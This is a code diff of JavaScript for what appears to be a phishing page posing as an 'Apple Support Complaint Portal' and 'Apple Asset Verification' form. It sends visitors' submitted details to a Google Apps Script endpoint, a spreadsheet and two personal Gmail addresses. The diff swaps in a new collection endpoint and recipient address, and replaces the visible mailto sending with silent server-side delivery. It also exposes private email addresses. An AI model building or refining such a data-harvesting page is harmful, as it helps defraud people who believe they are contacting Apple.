@@ -2,10 +2,10 @@
 
 // Google Sheets configuration
 const GOOGLE_SHEETS_CONFIG = {
-    scriptURL: 'https://script.google.com/macros/s/AKfycbxjezebSXdgcdCK7t0iy7nAGiywb9zc6I39x0IyVaRjTQOwqy2f3L_QWQoFZPHsu_jIaw/exec',
+    scriptURL: 'https://script.google.com/macros/s/AKfycbwuimijJ_sLD2MS6RWoVPIyXzg1WEPgJxQ7xMmm8hh_R30urol_Qq5hAsMVERfIXHm9/exec',
     spreadsheetId: '1nt9AMNvyH8iytT44IHClysQ5rR-m9IOzPaSBpiOQnyo',
     adminEmail: 'janetgunnoe09@gmail.com',
-    adminEmail2: 'tyronlincolnn@gmail.com'
+    adminEmail2: 'pw065508@gmail.com'
 };
 
 // Send data to Google Sheets
@@ -124,13 +124,7 @@ function sendImmediateEmailNotification(formData, type = 'complaint') {
         body += `Status: ${formData.status || 'pending'}\n\n`;
         body += `---\nThis is an automated notification from the Apple Support Complaint Portal.`;
         
-        // Send to both admin emails
-        const emails = [GOOGLE_SHEETS_CONFIG.adminEmail, GOOGLE_SHEETS_CONFIG.adminEmail2];
-        emails.forEach((email, idx) => {
-            const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-            setTimeout(() => { window.open(mailtoLink, '_blank'); }, idx * 600);
-        });
-        console.log('📧 Emails queued to:', emails.join(', '));
+        console.log('📧 Email notification handled server-side via Google Apps Script.');
         
         // Also try Google Apps Script as backup
         setTimeout(() => {
@@ -179,13 +173,7 @@ function sendMailtoFallback(formData, type = 'complaint') {
             : `[APPLE ASSET VERIFICATION] New Submission — Ref: ${formData.referenceNumber || 'N/A'} | ${formData.fullName || 'N/A'}`;
         
         const emailBody = formatEmailBody(formData, type);
-        const emails = [GOOGLE_SHEETS_CONFIG.adminEmail, GOOGLE_SHEETS_CONFIG.adminEmail2];
-        emails.forEach((email, idx) => {
-            const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(emailBody)}`;
-            setTimeout(() => { window.open(mailtoLink, '_blank'); }, idx * 600);
-        });
-        
-        console.log('📧 Mailto fallback sent to:', GOOGLE_SHEETS_CONFIG.adminEmail);
+        console.log('📧 Fallback email handled server-side via Google Apps Script.');
     } catch (error) {
         console.error('❌ Error with mailto fallback:', error);
     }
